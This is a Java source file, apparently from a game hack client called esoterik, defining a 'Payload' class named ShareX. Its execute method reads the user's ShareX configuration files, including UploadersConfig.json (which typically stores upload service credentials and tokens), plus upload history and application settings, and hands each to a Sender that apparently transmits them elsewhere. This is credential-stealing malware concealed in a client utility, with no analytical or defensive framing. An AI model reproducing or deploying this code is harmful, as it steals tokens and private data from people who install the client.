package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;

public final class ShareX implements Payload {
   public void execute() throws Exception {
      FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\UploadersConfig.json").ifPresent(Sender::send);
      FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\History.json").ifPresent(Sender::send);
      FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\ApplicationConfig.json").ifPresent(Sender::send);
   }
}
